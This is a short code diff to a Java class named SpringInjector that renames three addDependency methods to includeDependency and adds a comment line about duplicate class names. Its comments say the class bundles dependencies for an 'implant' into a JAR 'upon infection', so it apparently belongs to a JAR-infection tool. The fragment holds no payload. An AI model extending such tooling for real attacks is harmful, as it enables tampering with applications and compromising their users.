@@ -27,34 +27,37 @@ public class SpringInjector {
     /**
      * Add a class to be included in the JAR upon infection.
      * This is good for any dependencies that the implant needs.
+     * Only one class per class name can exist at the same time. The last put class (under the given name) will be used.
      * The name for the entry will be derived from the ClassFile instance.
      *
      * @param classData ClassFile instance
      * @throws IOException If the ClassFile cannot be serialized
      */
-    public void addDependency(ClassFile classData) throws IOException {
-        addDependency(ByteBuffer.wrap(asByteArray(classData)), classData.getName());
+    public void includeDependency(ClassFile classData) throws IOException {
+        includeDependency(ByteBuffer.wrap(asByteArray(classData)), classData.getName());
     }
 
     /**
      * Add a class to be included in the JAR upon infection.
+     * Only one class per class name can exist at the same time. The last put class (under the given name) will be used.
      * This is good for any dependencies that the implant needs.
      *
      * @param classData     Raw bytes representing the content of the class file
      * @param fullClassName The full name of the class, like "com.example.MyLib"
      */
-    public void addDependency(byte[] classData, String fullClassName) {
-        addDependency(ByteBuffer.wrap(classData), fullClassName);
+    public void includeDependency(byte[] classData, String fullClassName) {
+        includeDependency(ByteBuffer.wrap(classData), fullClassName);
     }
 
     /**
      * Add a class to be included in the JAR upon infection.
+     * Only one class per class name can exist at the same time. The last put class (under the given name) will be used.
      * This is good for any dependencies that the implant needs.
      *
      * @param classData     Raw bytes representing the content of the class file
      * @param fullClassName The full name of the class, like "com.example.MyLib"
      */
-    public void addDependency(ByteBuffer classData, String fullClassName) {
+    public void includeDependency(ByteBuffer classData, String fullClassName) {
         String pathInJar = convertToJarEntryPathName(fullClassName);
         dependencies.put(pathInJar, classData);
     }
